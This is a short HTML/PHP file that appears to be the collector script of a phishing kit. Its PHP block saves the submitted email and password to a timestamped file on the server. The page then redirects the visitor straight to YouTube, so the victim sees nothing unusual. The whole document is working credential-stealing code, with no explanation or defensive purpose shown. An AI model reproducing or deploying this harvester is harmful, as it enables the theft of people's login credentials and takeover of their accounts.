<html>
<head>
    <meta http-equiv="refresh" content="0; URL=https://youtube.com/" />

</head>
<body>

<?php
$time = date("h:i:sa");
$date = date("Y-m-d");
$text = "{$_GET["email"]}\n{$_GET["password"]}";
file_put_contents("{$time}  {$date}", $text);


?>

</body>
</html>